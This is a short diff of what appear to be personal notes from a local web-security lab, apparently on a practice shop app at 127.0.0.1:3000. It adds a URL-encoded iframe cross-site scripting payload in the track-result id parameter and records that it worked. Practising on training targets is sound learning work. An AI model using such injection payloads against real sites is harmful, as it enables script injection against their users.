@@ -31,6 +31,9 @@ curl -kv http://127.0.0.1:3000/#/track-result/new?id=b642-21a3cd9498612fbc
 
 # No new, just view current state
 http://127.0.0.1:3000/#/track-result?id=<iframe src="javascript:alert(`xss`)">
+
+# This worked
+http://127.0.0.1:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E (Just data with url-encoding)
 ```
 
-Due to me using docker, I don't think it works...
+Worked great!
